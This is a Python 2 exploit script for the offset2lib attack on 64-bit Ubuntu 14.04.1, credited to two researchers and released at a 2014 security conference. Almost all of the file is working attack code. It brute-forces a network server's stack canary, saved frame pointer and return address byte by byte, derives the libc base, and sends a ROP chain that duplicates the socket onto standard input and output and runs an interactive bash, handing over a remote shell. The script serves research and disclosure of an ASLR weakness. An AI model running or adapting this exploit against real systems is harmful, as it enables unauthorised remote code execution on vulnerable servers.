#!/usr/bin/python

'''
 * $FILE: exploit-offset2lib-ubuntu-14.04.1-LTS.py
 *
 * $VERSION$
 *
 * Authors: Hector Marco <hecmargi@upv.es>
 *          Ismael Ripoll <iripoll@disca.upv.es>
 *
 * Date:    Released 20 November 2014 (DeepSec 2014)
 * 
 * Attack details: http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html
 *
 * $LICENSE:  
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
'''


import struct
import os,sys
import socket
import random
import string
import telnetlib
import time
import base64
import getopt
from struct import pack

server = ''
port = ''

#################################### Start params ##############################
# Exploit configuration parameters.. Must be adjusted to the target system and app.
OFFSET_SAVED_RIP = 0x12f
PAGE_NUMBER_OF_NEXT_INSTRUCTION_TO_CALL = 0x1
OFFSET_TO_LIBC = 0x5ce000
#################################### End params ################################


def get_connection():
   s=socket.socket()
   s.connect((server,port))

   return s

def interact_shell(s):
   sys.stdout.flush()
   s.send("");
   time.sleep(0.2)
   sys.stdout.write(s.recv(4096))
   while True:
      try:
         sys.stdout.flush()
         c = sys.stdin.readline()
         s.send(c)
         time.sleep(0.5)
         sys.stdout.write(s.recv(4096))
      except KeyboardInterrupt, e:
         print " quit"
         s.close()
         break


def send2server(payload):
   print "[Payload]\n[0x%s]\n" % payload.encode("hex")
   s = get_connection()
   s.send("Hi server")
   res = s.recv(1024)
   s.send(payload)
   response = s.recv(1024)
   print "[Response]\n[0x%s]\n" % response.encode("hex")
   return response

#################### MAIN ####################

def usage():
   print 'exploit-server_64_PIE.py -s <server> -p <port>'
   sys.exit(2)

def main(argv):
   global server
   global port
   try:
      opts, args = getopt.getopt(argv,"hs:p:",["s=","p="])
      if len(sys.argv) == 1:
         usage()
   except getopt.GetoptError:
      usage()
   for opt, arg in opts:
      if opt == '-h':
         usage()
      elif opt in ("-s", "--server"):
         server = arg
      elif opt in ("-p", "--port"):
         port = int(arg)


if __name__ == "__main__":
   main(sys.argv[1:])


print "[+] Exploit ASLR 64 bit systems "
print "[+] Trying to find out the canary offset "

p = "\xff\xff\xff\xff\xff\xff\xff\xff"
while True:
   res = send2server(p)
   if res == "":
      break
   p += "\xff\xff\xff\xff\xff\xff\xff\xff"


# Remove last char
p = p[:-8]

print "   [+] Offset is %d bytes" % len(p)

print "[+] Brute forcing stack canary "

start = len(p)
stop = len(p)+8

while len(p) < stop:
   for i in xrange(0,256):
      res = send2server(p + chr(i))

      if res != "":
         p = p + chr(i)
         print "\t[+] Byte found 0x%02x" % i
         break

      if i == 255:
         print "[-] Exploit failed"
         sys.exit(-1)


canary = p[stop:start-1:-1].encode("hex")
print "   [+] SSP value is 0x%s" % canary

#set a valid RBP ....
print "[+] Brute forcing RBP "

start = len(p)
stop = len(p)+8

while len(p) < stop:
   for i in xrange(0,256):
      res = send2server(p + chr(i))

      if res != "":
         p = p + chr(i)
         print "\t[+] Byte found 0x%02x" % i
         break

      if i == 255:
         print "[-] Exploit failed"
         sys.exit(-1)


ebp = p[stop:start-1:-1].encode("hex")
print "   [+] EBP value is 0x%s" % ebp



print "[+] Brute forcing Saved RIP "

# We know the first and half byte so ...
# Add the first byte to the payload
p += chr((OFFSET_SAVED_RIP & 0xff))

# We aslo know the first half of the second byte 
half_second_byte_eip = (OFFSET_SAVED_RIP >> 8)

for i in range(0,16):
   
   res = send2server( p + chr(half_second_byte_eip) )

   if res != "":
      p += chr(half_second_byte_eip)
      break

   half_second_byte_eip += 0x10


start = len(p)
stop = len(p)+6 # We only need find out 7 bytes


while len(p) < stop:
   for i in xrange(0,256):
      
      res = send2server(p + chr(i))

      if res != "":
         p = p + chr(i)
         break

      if i == 255:
         print "[-] Exploit failed"
         sys.exit(-1)


eip = p[stop:start-3:-1].encode("hex")
print "   [+] RIP value is 0x%s" % eip

text_base = (int(eip, 16) &~ 0xfff) - (PAGE_NUMBER_OF_NEXT_INSTRUCTION_TO_CALL << 12)
print "[+] Text Base at 0x%016x" % text_base

libc_base = (int(text_base) - OFFSET_TO_LIBC)
print "[+] Libc Base at 0x%016x" % libc_base

# Remove last 8 bytes (Saved RIP)
dup_chain = p[:-8]

#print dup_chain.encode("HEX")
#raw_input()
off = libc_base

p = lambda x : pack('<Q', x)

IMAGE_BASE_0 = off # libc-2.19.so
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

def syscall_val_payload(sys_id=0x0,rsi=0x0,rdi=0x0,rdx=0x0):
   chain = ''
   chain += rebase_0(0x0000000000024125) # pop rsi ; ret OKKK
   chain += p(rsi)
   chain += rebase_0(0x0000000000022482) # pop rdi ; ret OKKK 
   chain += p(rdi)
   chain += rebase_0(0x0000000000001b8e) # 0x0000000000001b8e: pop rdx; ret; 
   chain += p(rdx)
   chain += rebase_0(0x0000000000038288) # pop rax ; ret OKKK
   chain += p(sys_id) 
   chain += rebase_0(0x00000000000bade5) # syscall ; ret
   return chain

def syscall_rebased_params(sys_id=0x0,rsi=0x0,rdi=0x0,rdx=0x0):
   chain = ''
   chain += rebase_0(0x0000000000022482) # 0x0000000000022482: pop rdi; ret; 
   chain += rebase_0(rdi)
   chain += rebase_0(0x0000000000024125) # 0x0000000000024125: pop rsi; ret; 
   chain += rebase_0(rsi)
   chain += rebase_0(0x0000000000001b8e) # 0x0000000000001b8e: pop rdx; ret; 
   chain += rebase_0(rdx)
   chain += rebase_0(0x0000000000038288) # 0x0000000000038288: pop rax; ret; 
   chain += p(sys_id)
   chain += rebase_0(0x00000000000bade5) # 0x00000000000bade5: syscall; ret;
   return chain


STR_OFFSET=0x00000000003a5080
def fat_add_string(data="////////"):
   global STR_OFFSET
   chain = ''
   chain += rebase_0(0x000000000001fe03) # 0x000000000001fe03: pop r13; ret; 
   chain += data
   chain += rebase_0(0x0000000000022482) # 0x0000000000022482: pop rdi; ret; 
   chain += rebase_0(STR_OFFSET) # 
   STR_OFFSET+=8
   chain += rebase_0(0x00000000000502a5) # 0x00000000000502a5: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
   chain += p(0xdeadbeefdeadbeef)
   chain += p(0xdeadbeefdeadbeef)
   chain += p(0xdeadbeefdeadbeef)
   chain += p(0xdeadbeefdeadbeef)
   print "STROFF=",hex(STR_OFFSET)
   return chain

def add_string(data="////////"):
   global STR_OFFSET
   chain = ''
   chain += rebase_0(0x0000000000001b8e) # pop rdx ; ret OKKK
   chain += data
   chain += rebase_0(0x0000000000022482) # pop rdi ; ret OKKK
   chain += rebase_0(STR_OFFSET) # 
   STR_OFFSET+=8
   chain += rebase_0(0x000000000001fb33) # mov qword ptr [rdi], rdx ; ret ## DEST is rdi
   print "STROFF=",hex(STR_OFFSET), "DATA=",data.encode("HEX")
   return chain

def mod_string(data="////////",off=STR_OFFSET):
   chain = ''
   chain += rebase_0(0x000000000001fe03) # 0x000000000001fe03: pop r13; ret; 
   chain += data
   chain += rebase_0(0x0000000000022482) # 0x0000000000022482: pop rdi; ret; 
   chain += rebase_0(off) # 
   chain += rebase_0(0x00000000000502a5) # 0x00000000000502a5: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
   chain += p(0xdeadbeefdeadbeef)
   chain += p(0xdeadbeefdeadbeef)
   chain += p(0xdeadbeefdeadbeef)
   chain += p(0xdeadbeefdeadbeef)
   print "Overwrite with ", data.encode("hex"), "from ", hex(off)
   return chain


def dup_pipes():
   chain = ''
   ## dup2(4,0)
   chain += syscall_val_payload(SYSCALL_ID_DUP,0x0,0x4)
   ## dup2(4,1)
   chain += syscall_val_payload(SYSCALL_ID_DUP,0x1,0x4)
   ## dup2(4,2)
   chain += syscall_val_payload(SYSCALL_ID_DUP,0x2,0x4)

   return chain

rop = ''
SYSCALL_ID_DUP=0x0000000000000021
SYSCALL_ID_EXECVE=0x000000000000003b
def exploit_noparams():
   chain = '' 
   chain += dup_pipes()
   OFFSET_FILE_BASH = STR_OFFSET
   chain += add_string("/bash.sh")
   chain += add_string("\x00"*8)
   OFFSET_INTERACTIVE_PARAM=STR_OFFSET-5
   OFFSET_ENVP_PARAM=STR_OFFSET-3
   chain += syscall_rebased_params(
      sys_id=SYSCALL_ID_EXECVE,
      rsi=OFFSET_INTERACTIVE_PARAM,
      rdi=OFFSET_FILE_BASH,
      rdx=OFFSET_ENVP_PARAM
   )
   return chain

def exploit_params():
   chain = '' 
   chain += dup_pipes()
   
   OFFSET_FILE_BASH = STR_OFFSET
   print "File Bash", hex(OFFSET_FILE_BASH)
   chain += add_string("/bin/bas")
   chain += add_string("hAAAAAAA")
   chain += mod_string("\x00"*8,STR_OFFSET-7)
   chain += add_string("\x00"*8)
   OFFSET_INTERACTIVE_PARAM=STR_OFFSET
   print "-i param", hex(OFFSET_INTERACTIVE_PARAM)
   chain += add_string("-iAAAAAA")
   chain += mod_string("\x00"*8,STR_OFFSET-6)
   chain += add_string("\x00"*8)
   
   print "ARray off", hex(STR_OFFSET)
   OFFSET_ARGV=STR_OFFSET
   chain += add_string(
      rebase_0(OFFSET_FILE_BASH)
   )
   chain += add_string(
      rebase_0(OFFSET_INTERACTIVE_PARAM)
   )
   chain += add_string(
      "\x00"*8
   )
   
   OFFSET_ENVP_PARAM=STR_OFFSET
   print "Env p", hex(OFFSET_ENVP_PARAM)
   chain += add_string(
      "\x00"*8
   )
   chain += syscall_rebased_params(
      sys_id=SYSCALL_ID_EXECVE,
      rsi=OFFSET_ARGV,
      rdi=OFFSET_FILE_BASH,
      rdx=OFFSET_ENVP_PARAM
   )
   return chain   
print "[+] Getting shell ..."
#rop = exploit_noparams()
rop = exploit_params()
payload=dup_chain+rop

print payload.encode("hex")
s = get_connection();
s.send("Exploit by punxos"); # send some bytes
res = s.recv(256); # read banner
s.send(payload); # send payload

interact_shell(s);






